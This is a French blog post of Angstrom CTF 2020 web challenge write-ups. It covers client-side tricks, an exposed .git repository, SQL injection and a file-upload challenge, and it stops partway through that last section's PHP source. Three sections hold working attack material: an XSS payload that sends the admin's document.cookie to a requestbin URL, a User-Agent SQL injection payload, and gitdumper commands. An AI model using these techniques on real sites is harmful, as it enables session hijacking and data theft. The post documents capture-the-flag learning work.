<!DOCTYPE html>
<html lang="en">





<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="description" content="This is a description">
  <meta name="keywords" content="blog and jekyll">
  <meta name="author" content="Angstrom CTF 2020 | Thomas • Personal blog">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="theme-color" content="#f5f5f5">

  <!-- Twitter Tags -->
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Angstrom CTF 2020 | Thomas • Personal blog">
  <meta name="twitter:description" content="This is a description">
  
    <meta property="twitter:image" content="/img/leonids-logo.png">
  

  <!-- Open Graph Tags -->
  <meta property="og:type" content="blog">
  <meta property="og:url" content="/articles/2020-03/Angstrom-CTF-web">
  <meta property="og:title" content="Angstrom CTF 2020 | Thomas • Personal blog">
  <meta property="og:description" content="This is a description">
  
    <meta property="og:image" content="/img/leonids-logo.png">
  
  <title>Angstrom CTF 2020 | Thomas • Personal blog</title>

  <!-- CSS files -->
  <link rel="stylesheet" href="/css/font-awesome.min.css">
  <link rel="stylesheet" href="/css/main.css">

  <link rel="canonical" href="/articles/2020-03/Angstrom-CTF-web">
  <link rel="alternate" type="application/rss+xml" title="Thomas • Personal blog" href="/feed.xml" />

  <!-- Icons -->
  <!-- 16x16 -->
  <link rel="shortcut icon" href="/favicon.ico">
  <!-- 32x32 -->
  <link rel="shortcut icon" href="/favicon.png">
</head>


<body>
  <div class="row">
    <div class="col s12 m3">
      <div class="table cover">
        

<div class="cover-card table-cell table-middle">
  
  <a href="/">
    <img src="/img/avatar.png" alt="" class="avatar">
  </a>
  
  <a href="/" class="author_name">Thomas</a>
  
  <span class="author_job">Infosec student</span>
  
  
  <span class="author_bio mbm">CTF write-ups and articles</span>
  
  <nav class="nav">
    <ul class="nav-list">
      <li class="nav-item">
        <a href="/">home</a>
      </li>
         
      <li class="nav-item">
        <a href="/about/">About</a>
      </li>
        
      <li class="nav-item">
        <a href="/archive/">Archive</a>
      </li>
          
      <li class="nav-item">
        <a href="/categories/">Categories</a>
      </li>
              
      <li class="nav-item">
        <a href="/tags/">Tags</a>
      </li>
         
    </ul>
  </nav>
  <script type="text/javascript">
  // based on http://stackoverflow.com/a/10300743/280842
  function gen_mail_to_link(hs, subject) {
    var lhs,rhs;
    var p = hs.split('@');
    lhs = p[0];
    rhs = p[1];
    document.write("<a class=\"social-link-item\" target=\"_blank\" href=\"mailto");
    document.write(":" + lhs + "@");
    document.write(rhs + "?subject=" + subject + "\"><i class=\"fa fa-fw fa-envelope\"></i><\/a>");
  }
</script>
<div class="social-links">
  <ul>
    
    
    
    
    
    
    
    
    
    <li><a href="http://github.com/thyzavard" class="social-link-item" target="_blank"><i class="fa fa-fw fa-github"></i></a></li>
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <li><a href="https://root-me.org/thyz" class="social-link-item" target="_blank"><i class="fa fa-fw fa-lock"></i></a></li>
    <li><a href="https://www.hackthebox.eu/home/users/profile/106328" class="social-link-item" target="_blank"><i class="fa fa-fw fa-cube"></i></a></li>
  </ul>
</div>

</div>

      </div>
    </div>
    <div class="col s12 m9">
      <div class="post-listing">
        <a class="btn" href= "/" >
  Home
</a>



<div id="post">
  <header class="post-header">
    <h1 title="Angstrom CTF 2020">Angstrom CTF 2020</h1>
    <span class="post-meta">
      <span class="post-date">
        17 MAR 2020
      </span>
      •
      <span class="read-time" title="Estimated read time">
  
  
    26 mins read
  
</span>

    </span>

  </header>

  <article class="post-content">
    <h1 id="web">Web</h1>
<h2 id="the-magic-word">The Magic Word</h2>
<blockquote>
  <p><strong>DESCRIPTION</strong>: <a href="https://magicword.2020.chall.actf.co/">Ask and you shall receive</a>…that is as long as you use the magic word.</p>

</blockquote>

<p>On tombe sur une page statique avec le message “give flag”.
<img src="/img/angstrom_2020_magic_word.png" alt="Challenge" class="center-image" />
Dans ce premier challenge, rien de très compliqué. On affiche les sources de la page affiché. Et on tombe sur le script Javascript suivant:</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">msg</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">magic</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">magic</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">please give flag</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">/flag?msg=</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">innerText</span><span class="p">))</span>
            <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">res</span> <span class="o">=&gt;</span> <span class="nx">res</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
            <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">txt</span> <span class="o">=&gt;</span> <span class="nx">magic</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">txt</span><span class="p">.</span><span class="nx">split</span><span class="s2">``</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">v</span> <span class="o">=&gt;</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nx">v</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xf</span><span class="p">)).</span><span class="nx">join</span><span class="s2">``</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">},</span> <span class="mi">1000</span><span class="p">);</span>
</code></pre></div></div>
<p>Si la balise &lt;p&gt; avec l’id “magic” contient la texte “please give flag”, ce dernier va être affiché.
On inspecte l’élément, on change la valeur de contenu dans la balise avec l’id “magic”. Et le flag apparaît.
<img src="/img/angstrom_2020_magic_word_flag.png" alt="Challenge" class="center-image" /></p>

<h2 id="xmas-still-stands">Xmas Still Stands</h2>
<blockquote>
  <p><strong>DESCRIPTION</strong>: You remember when I said I dropped clam’s tables? Well that was on Xmas day. And because I ruined his Xmas, he created the <a href="https://xmas.2020.chall.actf.co/">Anti Xmas Warriors</a> to try to ruin everybody’s Xmas. Despite his best efforts, Xmas Still Stands. But, he did manage to get a flag and put it on his site. Can you get it?</p>
</blockquote>

<p>Nous sommes redirigé vers un site visant à détruire Noël! Le site est composé de <strong>4</strong> onglets:</p>
<ul>
  <li><strong>Home</strong> -&gt; Un simple message expliquant l’intérêt du site</li>
  <li><strong>Post</strong> -&gt; Une zone de texte permettant de donner des idées sur comment ruiner Noël</li>
  <li><strong>Report</strong> -&gt; Ici, nous pouvons renseigner l’ID d’un post à un administrateur afin qu’il aille en vérifier son contenu</li>
  <li><strong>Admin</strong> -&gt; Page d’administration inaccessible sans le cookie administrateur</li>
</ul>

<p>Tout de suite, je pense à une XSS où il va falloir voler le cookie de l’administrateur. Pour ce faire, il faut trouver où est situé la XSS. Avec un simple payload <code class="language-plaintext highlighter-rouge">&lt;img src=x onerror=alert('XSS');&gt;</code> dans la zone de texte de l’onglet <strong>Post</strong>.</p>

<p><img src="/img/angstrom_2020_xmas_xss.png" alt="Challenge" class="center-image" />
Sans surprise, l’alert apparaît.</p>

<p>Pour récupérer le cookie, il va falloir un hook sur lequel effectuer une requête contenant le cookie de l’administrateur. Pour cela, j’ai utiliser <a href="http://requestbin.net/">requestbin</a>.<br />
Le payload est triviale : <code class="language-plaintext highlighter-rouge">&lt;img src=x onerror="this.src='http://requestbin.net/r/xxxxxxxx/?'+document.cookie; this.removeAttribute('onerror');"&gt;</code>.<br />
Une fois le post envoyé, on récupère son ID et on la renseigne dans l’onglet <strong>Report</strong> afin qu’un administrateur vienne jeter un oeil à notre post. On attend quelques secondes et une requête est effectué sur notre hook, avec dans l’URL, le <strong>nom</strong> et la <strong>valeur</strong> du cookie.</p>

<p><img src="/img/angstrom_2020_xmas_get.png" alt="Challenge" class="center-image" /></p>

<p>Il ne reste plus qu’à renseigner ce cookie dans notre navigateur et d’essayer d’accéder à la section <strong>Admin</strong>.
Et voilà!</p>

<p><img src="/img/angstrom_2020_xmas_flag.png" alt="Challenge" class="center-image" /></p>

<p>Flag <code class="language-plaintext highlighter-rouge">actf{s4n1tize_y0ur_html_4nd_y0ur_h4nds}</code></p>

<h2 id="consolation">Consolation</h2>
<blockquote>
  <p><strong>DESCRIPTION</strong>: I’ve been feeling down lately… <a href="https://consolation.2020.chall.actf.co/">Cheer me up!</a></p>
</blockquote>

<p>Sur ce challenge, on arrive sur une page avec un bouton et un compteur de $. Lorsque l’on clique sur le bouton, le compteur est incrémenté de 25$. Lorsque j’ai inspecté la page, j’ai vu l’existence d’un script <a href="https://consolation.2020.chall.actf.co/iftenmillionfireflies.js">iftenmillionfireflies.js</a> qui est totalement obfusqué.
<img src="/img/angstrom_2020_consolation.png" alt="Challenge" class="center-image" />
J’ai d’abord cru qu’il fallais déobfusquer le script afin de comprendre son fonctionnement. Grâce à ça j’ai découvert beaucoup de choses, mais qui au final était juste là pour brouiller les pistes!</p>

<p>Lorsque je faisais des tests dans la console afin de vérifier le contenu de certains variables, j’ai cliqué sur le bouton et la console s’est effacé! C’est à ce moment là que j’ai compris qu’il fallais creuser comprendre pourquoi clear la console à chaque clique sur le bouton. En faisant une recherche du mot clé <code class="language-plaintext highlighter-rouge">clear</code> dans le script JS obfusqué, j’ai trouvé cette instruction, qui est la cause du clear de la console lors d’un clique sur le bouton.
<img src="/img/angstrom_2020_consolation_clear.png" alt="Challenge" class="center-image" /></p>

<p>J’ai télécharger le script JS et la page HTML en local et j’ai supprimé l’instruction <code class="language-plaintext highlighter-rouge">console['clear']();</code>, j’ai cliqué sur le bouton et TA-DA!</p>

<p><img src="/img/angstrom_2020_consolation_flag.png" alt="Challenge" class="center-image" /></p>

<p>Flag <code class="language-plaintext highlighter-rouge">actf{you_would_n0t_beli3ve_your_eyes}</code></p>

<h2 id="git-good">Git Good</h2>
<blockquote>
  <p><strong>DESCRIPTION</strong>: Did you know that angstrom has a git repo for all the challenges? I noticed that clam committed <a href="https://gitgood.2020.chall.actf.co/">a very work in progress challenge</a> so I thought it was worth sharing.</p>
</blockquote>

<p>On arrive sur une page statique avec le message “Hello, world!” affiché. En effectuant des recherches classiques ‘/robots.txt’, ‘/.git’, etc. Je n’ai rien trouvé d’intéressant, j’ai également essayer de lister les répertoires avec <code class="language-plaintext highlighter-rouge">gobuster</code>, sans succès non plus. J’ai fini par essayer l’outil <a href="https://github.com/maurosoria/dirsearch">dirsearch</a> qui a eu plus de succès !</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python dirsearch.py -u https://gitgood.2020.chall.actf.co -e * -b
[21:55:29] 200 -   15B  - /.git/COMMIT_EDITMSG
[21:55:29] 200 -   92B  - /.git/config
[21:55:29] 200 -   23B  - /.git/HEAD
[21:55:29] 200 -   73B  - /.git/**description**
[21:55:29] 200 -  537B  - /.git/index
[21:55:29] 200 -  240B  - /.git/info/exclude
[21:55:29] 200 -  353B  - /.git/logs/HEAD
[21:55:29] 301 -  195B  - /.git/logs/refs  -&gt;  /.git/logs/refs/
[21:55:29] 301 -  207B  - /.git/logs/refs/heads  -&gt;  /.git/logs/refs/heads/
[21:55:29] 200 -  353B  - /.git/logs/refs/heads/master
[21:55:29] 301 -  197B  - /.git/refs/heads  -&gt;  /.git/refs/heads/
[21:55:29] 200 -   41B  - /.git/refs/heads/master
</code></pre></div></div>
<p>Finalement, nous n’avons pas accès au répertoire ‘.git’ mais il est possible d’avoir accès à tous les fichiers contenu dans ce répertoire.<br />
Le script n’a pas trouvé tous les fichiers car il manque le répertoire ‘objects’ caractéristiques de la structure du répertoire ‘.git’.<br />
Pour extraire l’ensemble des fichiers contenu dans le répertoire ‘.git’, j’au utiliser l’outil <code class="language-plaintext highlighter-rouge">gitdumper</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ bash gitdumper.sh https://gitgood.2020.chall.actf.co/.git/ clone
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating tmp/.git/
[+] Downloaded: HEAD
[+] Downloaded: objects/info/packs
[+] Downloaded: **description**
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[+] Downloaded: info/refs
[+] Downloaded: info/exclude
[+] Downloaded: objects/e9/75d678f209da09fff763cd297a6ed8dd77bb35
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/6b/3c94c0b90a897f246f0f32dec3f5fd3e40abb5
[+] Downloaded: objects/94/02d143d3d7998247c95597b63598ce941e7bcb
[+] Downloaded: objects/b6/30430d9d393a6b143af2839fd24ac2118dba79
[+] Downloaded: objects/c2/658d7d1b31848c3b71960543cb0368e56cd4c7
[+] Downloaded: objects/63/8887a54973265c428cd51ce6dfd48f196d91c4
[+] Downloaded: objects/49/b319c37dc674bca682cab0f2506473dda6bd9a
[+] Downloaded: objects/78/9fa5caf452f5f6f25bfa9b1c0ab1d593dce1b3
[+] Downloaded: objects/8f/08af35205d0ba80e94b4f4306311039d62e138
[+] Downloaded: objects/24/7c9d491c0d2d6da5e93afcd0681b3edd7ccd70
[+] Downloaded: objects/0f/52598006f9cdb21db2f4c8d44d70535630289b

$ cd clone
$ git status
On branch master
Changes not staged for commit:
  (use "git add/rm &lt;file&gt;..." to update what will be committed)
  (use "git restore &lt;file&gt;..." to discard changes in working directory)
	deleted:    .gitignore
	deleted:    index.html
	deleted:    index.js
	deleted:    package-lock.json
	deleted:    package.json
	deleted:    thisistheflag.txt
</code></pre></div></div>
<p>Maintenant que le repo est en local, il est possible d’intéragir avec les commandes git classiques.<br />
On remarque le fichier supprimé ‘thisistheflag.txt’, avec la commande <code class="language-plaintext highlighter-rouge">git checkout --</code> on restaure le fichier pour le lire.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ git checkout -- thisistheflag.txt
$ cat thisistheflag.txt
There used to be a flag here...
</code></pre></div></div>
<p>On comprend donc qu’il faut remonter à un commit précédent pour lire le flag précédement renseigné.
Avec <code class="language-plaintext highlighter-rouge">git log</code>, on énumère tous les commits de la branche master. Et on trouve un seul commit avant celui actuel:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ git log
commit e975d678f209da09fff763cd297a6ed8dd77bb35 (HEAD -&gt; master)
Author: aplet123 &lt;noneof@your.business&gt;
Date:   Sat Mar 7 16:27:44 2020 +0000

    Initial commit

commit 6b3c94c0b90a897f246f0f32dec3f5fd3e40abb5
Author: aplet123 &lt;noneof@your.business&gt;
Date:   Sat Mar 7 16:27:24 2020 +0000

    haha I lied this is the actual initial commit
</code></pre></div></div>
<p>Avec la commande <code class="language-plaintext highlighter-rouge">git reset --hard &lt;hash_commit&gt;</code>, on repositionne la tête de la branche sur le commit qui nous intéresse. Une fois sur le bon commit, il ne reste plus qu’a afficher le flag!</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ git reset --hard 6b3c94c0b90a897f246f0f32dec3f5fd3e40abb5
$ cat thisistheflag.txt
actf{b3_car3ful_wh4t_y0u_s3rve_wi7h}

btw this isn't the actual git server
</code></pre></div></div>

<p>Flag: <code class="language-plaintext highlighter-rouge">actf{b3_car3ful_wh4t_y0u_s3rve_wi7h}</code></p>

<h2 id="secret-agents">Secret Agents</h2>
<blockquote>
  <p><strong>DESCRIPTION</strong>: Can you enter <a href="https://agents.2020.chall.actf.co/">the secret agent portal</a>? I’ve heard someone has a flag :eyes:</p>

  <p>Our insider leaked <a href="https://files.actf.co/b8ec533304b09d0100428d372d8392ba4f798bded442038e045334266d758b29/app.py">the source</a>, but was “terminated” shortly thereafter…</p>
</blockquote>

<p>On nous fournis les sources du site, et on repère assez facilement qu’une injection SQL est possible à partir du chams <strong>User-Agent</strong>.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span>

<span class="kn">from</span> <span class="nn">.secret</span> <span class="kn">import</span> <span class="n">host</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">passwd</span><span class="p">,</span> <span class="n">dbname</span>

<span class="kn">import</span> <span class="nn">mysql.connector</span>

<span class="n">dbconfig</span> <span class="o">=</span> <span class="p">{</span>
	<span class="s">"host"</span><span class="p">:</span><span class="n">host</span><span class="p">,</span>
	<span class="s">"user"</span><span class="p">:</span><span class="n">user</span><span class="p">,</span>
	<span class="s">"passwd"</span><span class="p">:</span><span class="n">passwd</span><span class="p">,</span>
	<span class="s">"database"</span><span class="p">:</span><span class="n">dbname</span>
<span class="p">}</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
	<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"index.html"</span><span class="p">)</span>


<span class="o">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/login"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
	<span class="n">u</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">"User-Agent"</span><span class="p">)</span>

	<span class="n">conn</span> <span class="o">=</span> <span class="n">mysql</span><span class="o">.</span><span class="n">connector</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">pool_name</span><span class="o">=</span><span class="s">"poolofagents"</span><span class="p">,</span>
					<span class="n">pool_size</span><span class="o">=</span><span class="mi">16</span><span class="p">,</span>
					<span class="o">**</span><span class="n">dbconfig</span><span class="p">)</span>

	<span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>

	<span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"SELECT * FROM Agents WHERE UA='</span><span class="si">%</span><span class="s">s'"</span><span class="o">%</span><span class="p">(</span><span class="n">u</span><span class="p">),</span> <span class="n">multi</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
		<span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">with_rows</span><span class="p">:</span>
			<span class="n">res</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
			<span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
			<span class="k">break</span>



	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
		<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"login.html"</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="s">"stop! you're not allowed in here &gt;:)"</span><span class="p">)</span>

	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
		<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"login.html"</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="s">"hey! close, but no bananananananananana!!!! (there are many secret agents of course)"</span><span class="p">)</span>


	<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"login.html"</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="s">"Welcome, </span><span class="si">%</span><span class="s">s"</span><span class="o">%</span><span class="p">(</span><span class="n">res</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]))</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
	<span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s">'0.0.0.0'</span><span class="p">)</span>
</code></pre></div></div>
<p>La <em>difficulté</em> est qu’il faut que le résultat de la requête comporte plus d’un résultat. Ce que nous permet de faire le payload suivant: <code class="language-plaintext highlighter-rouge">'OR 1 LIMIT 2,1 #</code></p>

<p><img src="/img/angstrom_2020_agent_flag.png" alt="Challenge" class="center-image" /></p>

<p>Flag <code class="language-plaintext highlighter-rouge">actf{nyoom_1_4m_sp33d}</code></p>

<h2 id="defunds-crypt">Defund’s Crypt</h2>
<blockquote>
  <p><strong>DESCRIPTION</strong>: One year since defund’s descent. One crypt. One void to fill. Clam must do it, <a href="https://crypt.2020.chall.actf.co/">and so must you</a>.</p>
</blockquote>

<p>On est redirigé vers une page nous proposant d’upload une image.<br />
Lorsque j’ai inspecté la page, il est indiqué que les source du la page se situe sur <strong>/src</strong> et que la flag est contenu dans le fichier <strong>/flag.txt</strong> sur le filesystem.</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- Defund was a big fan of open source so head over to /src.php --&gt;</span>
<span class="c">&lt;!-- Also I have a flag in the filesystem at /flag.txt but too bad you can't read it --&gt;</span>
<span class="nt">&lt;h1&gt;</span>Defund's Crypt<span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"small"</span><span class="nt">&gt;</span>o<span class="nt">&lt;/span&gt;&lt;/h1&gt;</span>
<span class="nt">&lt;p&gt;</span>You must leave behind a memory lest you be forgotten forever.<span class="nt">&lt;/p&gt;</span>        <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"crypt.jpg"</span> <span class="na">height=</span><span class="s">"300"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"/"</span> <span class="na">autocomplete=</span><span class="s">"off"</span> <span class="na">spellcheck=</span><span class="s">"false"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;p&gt;</span>Leave a memory:<span class="nt">&lt;/p&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">id=</span><span class="s">"imgfile"</span> <span class="na">name=</span><span class="s">"imgfile"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"imgfile"</span> <span class="na">id=</span><span class="s">"imglbl"</span><span class="nt">&gt;</span>Choose an image...<span class="nt">&lt;/label&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Descend"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;script&gt;</span>
    <span class="nx">imgfile</span><span class="p">.</span><span class="nx">oninput</span> <span class="o">=</span> <span class="nx">_</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="nx">imgfile</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="dl">"</span><span class="s2">satisfied</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">imglbl</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">imgfile</span><span class="p">.</span><span class="nx">files</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">name</span><span class="p">;</span>
    <span class="p">};</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>Le code source de la page d’accueil est ci-dessous:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;head&gt;</span>
        <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width,initial-scale=1"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"https://fonts.googleapis.com/css?family=Inconsolata|Special+Elite&amp;display=swap"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"/style.css"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;title&gt;</span>Defund's Crypt<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;/head&gt;</span>
    <span class="nt">&lt;body&gt;</span>
        <span class="c">&lt;!-- Defund was a big fan of open source so head over to /src.php --&gt;</span>
        <span class="c">&lt;!-- Also I have a flag in the filesystem at /flag.txt but too bad you can't read it --&gt;</span>
        <span class="nt">&lt;h1&gt;</span>Defund's Crypt<span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"small"</span><span class="nt">&gt;</span>o<span class="nt">&lt;/span&gt;&lt;/h1&gt;</span>
        <span class="cp">&lt;?php</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REQUEST_METHOD"</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"POST"</span><span class="p">)</span> <span class="p">{</span>
                <span class="c1">// I just copy pasted this from the PHP site then modified it a bit</span>
                <span class="c1">// I'm not gonna put myself through the hell of learning PHP to write one lousy angstrom chall</span>
                <span class="k">try</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span>
                        <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'imgfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">])</span> <span class="o">||</span>
                        <span class="nb">is_array</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'imgfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">])</span>
                    <span class="p">)</span> <span class="p">{</span>
                        <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'The crypt rejects you.'</span><span class="p">);</span>
                    <span class="p">}</span>
                    <span class="k">switch</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'imgfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">])</span> <span class="p">{</span>
                        <span class="k">case</span> <span class="nx">UPLOAD_ERR_OK</span><span class="o">:</span>
                            <span class="k">break</span><span class="p">;</span>
                        <span class="k">case</span> <span class="nx">UPLOAD_ERR_NO_FILE</span><span class="o">:</span>
                            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'You must leave behind a memory lest you be forgotten forever.'</span><span class="p">);</span>
                        <span class="k">case</span> <span class="nx">UPLOAD_ERR_INI_SIZE</span><span class="o">:</span>
                        <span class="k">case</span> <span class="nx">UPLOAD_ERR_FORM_SIZE</span><span class="o">:</span>
                            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'People can only remember so much.'</span><span class="p">);</span>
                        <span class="k">default</span><span class="o">:</span>
                            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'The crypt rejects you.'</span><span class="p">);</span>
                    <span class="p">}</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'imgfile'</span><span class="p">][</span><span class="s1">'size'</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">1000000</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'People can only remember so much..'</span><span class="p">);</span>
                    <span class="p">}</span>
                    <span class="nv">$finfo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">finfo</span><span class="p">(</span><span class="nx">FILEINFO_MIME_TYPE</span><span class="p">);</span>
                    <span class="k">if</span> <span class="p">(</span><span class="kc">false</span> <span class="o">===</span> <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">array_search</span><span class="p">(</span>
                        <span class="nv">$finfo</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'imgfile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">]),</span>
                        <span class="k">array</span><span class="p">(</span>
                            <span class="s1">'.jpg'</span> <span class="o">=&gt;</span> <span class="s1">'image/jpeg'</span><span class="p">,</span>
                            <span class="s1">'.png'</span> <span class="o">=&gt;</span> <span class="s1">'image/png'</span><span class="p">,</span>
                            <span class="s1">'.bmp'</span> <span class="o">=&gt;</span> <span class="s1">'image/bmp'</span><span class="p">,</span>
                        <span class="p">),</span>
